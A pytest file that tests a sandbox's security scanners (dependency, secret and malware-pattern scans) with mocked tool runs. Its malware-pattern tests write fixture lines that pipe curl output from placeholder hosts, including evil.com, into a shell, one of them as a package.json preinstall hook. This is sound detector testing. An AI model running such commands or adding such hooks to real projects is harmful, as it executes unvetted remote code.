"""Tests for the per-scan subprocess wrappers — all mocked via monkeypatch."""
from __future__ import annotations

import json
import subprocess
from pathlib import Path

import pytest

from services.oss_intake_sandbox import scans


@pytest.fixture
def clone(tmp_path: Path) -> Path:
    """Make a tiny throwaway clone directory tree to scan against."""
    c = tmp_path / "clone"
    c.mkdir()
    (c / "README.md").write_text("hello world", encoding="utf-8")
    return c


@pytest.fixture
def out_dir(tmp_path: Path) -> Path:
    d = tmp_path / "scans"
    d.mkdir()
    return d


# ─── tool-not-installed → skipped ─────────────────────────────────────────


def test_osv_scanner_skipped_when_missing(monkeypatch, clone, out_dir) -> None:
    monkeypatch.setattr(scans, "_which", lambda tool: None)
    result = scans.run_osv_scanner(clone, out_dir)
    assert result.status == "skipped"
    assert "osv-scanner" in result.reason
    assert result.findings_count == 0


def test_gitleaks_skipped_when_missing(monkeypatch, clone, out_dir) -> None:
    monkeypatch.setattr(scans, "_which", lambda tool: None)
    result = scans.run_gitleaks(clone, out_dir)
    assert result.status == "skipped"


def test_syft_skipped_when_missing(monkeypatch, clone, out_dir) -> None:
    monkeypatch.setattr(scans, "_which", lambda tool: None)
    result = scans.run_syft(clone, out_dir)
    assert result.status == "skipped"


def test_semgrep_skipped_when_missing(monkeypatch, clone, out_dir) -> None:
    monkeypatch.setattr(scans, "_which", lambda tool: None)
    result = scans.run_semgrep(clone, out_dir)
    assert result.status == "skipped"


def test_trivy_skipped_when_missing(monkeypatch, clone, out_dir) -> None:
    monkeypatch.setattr(scans, "_which", lambda tool: None)
    result = scans.run_trivy(clone, out_dir)
    assert result.status == "skipped"


# ─── happy-path: pass ─────────────────────────────────────────────────────


def test_osv_scanner_pass_no_vulns(monkeypatch, clone, out_dir) -> None:
    monkeypatch.setattr(scans, "_which", lambda tool: f"/usr/local/bin/{tool}")

    def fake_run(cmd, cwd, timeout):
        return subprocess.CompletedProcess(cmd, 0, stdout=json.dumps({"results": []}), stderr="")

    monkeypatch.setattr(scans, "_run", fake_run)
    result = scans.run_osv_scanner(clone, out_dir)
    assert result.status == "pass"
    assert result.findings_count == 0


def test_gitleaks_pass_no_secrets(monkeypatch, clone, out_dir) -> None:
    monkeypatch.setattr(scans, "_which", lambda tool: f"/usr/local/bin/{tool}")

    def fake_run(cmd, cwd, timeout):
        # gitleaks writes the report file; simulate by writing []
        report_path = Path(cmd[cmd.index("--report-path") + 1])
        report_path.write_text("[]", encoding="utf-8")
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    monkeypatch.setattr(scans, "_run", fake_run)
    result = scans.run_gitleaks(clone, out_dir)
    assert result.status == "pass"
    assert result.findings_count == 0


# ─── findings path ────────────────────────────────────────────────────────


def test_osv_scanner_finds_vulns(monkeypatch, clone, out_dir) -> None:
    monkeypatch.setattr(scans, "_which", lambda tool: f"/usr/local/bin/{tool}")
    fake_output = {
        "results": [
            {
                "packages": [
                    {
                        "vulnerabilities": [
                            {"id": "CVE-1", "database_specific": {"severity": "HIGH"}},
                            {"id": "CVE-2", "database_specific": {"severity": "MEDIUM"}},
                            {"id": "CVE-3", "database_specific": {"severity": "HIGH"}},
                        ]
                    }
                ]
            }
        ]
    }

    def fake_run(cmd, cwd, timeout):
        return subprocess.CompletedProcess(cmd, 1, stdout=json.dumps(fake_output), stderr="")

    monkeypatch.setattr(scans, "_run", fake_run)
    result = scans.run_osv_scanner(clone, out_dir)
    assert result.status == "findings"
    assert result.findings_count == 3
    assert result.severity_breakdown == {"HIGH": 2, "MEDIUM": 1}


def test_gitleaks_finds_secret(monkeypatch, clone, out_dir) -> None:
    monkeypatch.setattr(scans, "_which", lambda tool: f"/usr/local/bin/{tool}")

    def fake_run(cmd, cwd, timeout):
        report_path = Path(cmd[cmd.index("--report-path") + 1])
        report_path.write_text(
            json.dumps([{"RuleID": "aws-key", "File": "config.py"}]),
            encoding="utf-8",
        )
        return subprocess.CompletedProcess(cmd, 1, stdout="", stderr="")

    monkeypatch.setattr(scans, "_run", fake_run)
    result = scans.run_gitleaks(clone, out_dir)
    assert result.status == "findings"
    assert result.findings_count == 1


# ─── malware pattern (always runs, no external dep) ───────────────────────


def test_malware_pattern_clean(clone, out_dir) -> None:
    # clone fixture has only a benign README — pattern scan should be clean
    result = scans.run_malware_pattern_scan(clone, out_dir)
    assert result.status == "pass"
    assert result.findings_count == 0


def test_malware_pattern_catches_curl_pipe(clone, out_dir) -> None:
    (clone / "install.sh").write_text(
        "#!/bin/bash\ncurl -fsSL https://example.com/install | bash\n",
        encoding="utf-8",
    )
    result = scans.run_malware_pattern_scan(clone, out_dir)
    assert result.status == "findings"
    assert result.findings_count >= 1
    assert "curl_pipe_sh" in result.severity_breakdown


def test_malware_pattern_catches_preinstall_script(clone, out_dir) -> None:
    (clone / "package.json").write_text(
        json.dumps({"scripts": {"preinstall": "curl -s https://x/setup | sh -"}}),
        encoding="utf-8",
    )
    result = scans.run_malware_pattern_scan(clone, out_dir)
    assert result.status == "findings"
    # both curl_pipe_sh and preinstall_script_pattern can match — at least one fires
    assert any(
        k in result.severity_breakdown
        for k in ("preinstall_script_pattern", "curl_pipe_sh")
    )


def test_malware_pattern_skips_binary_dirs(clone, out_dir) -> None:
    # Put a suspicious-looking file inside node_modules — should be skipped
    nm = clone / "node_modules" / "evil"
    nm.mkdir(parents=True)
    (nm / "x.sh").write_text("curl evil.com | bash", encoding="utf-8")
    result = scans.run_malware_pattern_scan(clone, out_dir)
    assert result.status == "pass"


# ─── error path ───────────────────────────────────────────────────────────


def test_osv_scanner_unexpected_exit_code(monkeypatch, clone, out_dir) -> None:
    monkeypatch.setattr(scans, "_which", lambda tool: f"/usr/local/bin/{tool}")

    def fake_run(cmd, cwd, timeout):
        return subprocess.CompletedProcess(cmd, 127, stdout="", stderr="command not found something")

    monkeypatch.setattr(scans, "_run", fake_run)
    result = scans.run_osv_scanner(clone, out_dir)
    assert result.status == "error"


# ─── run_all_scans dispatch ───────────────────────────────────────────────


def test_run_all_scans_returns_every_runner(monkeypatch, clone, out_dir) -> None:
    monkeypatch.setattr(scans, "_which", lambda tool: None)  # all tools missing -> all skipped
    results = scans.run_all_scans(clone, out_dir)
    assert set(results.keys()) == set(scans.SCAN_RUNNERS.keys())
    # malware-pattern doesn't depend on external tool, so it should be 'pass' (clone is clean)
    assert results["malware-pattern"].status == "pass"
    # external-tool scans should all be skipped
    for name in ("osv-scanner", "gitleaks", "syft", "semgrep", "trivy"):
        assert results[name].status == "skipped"
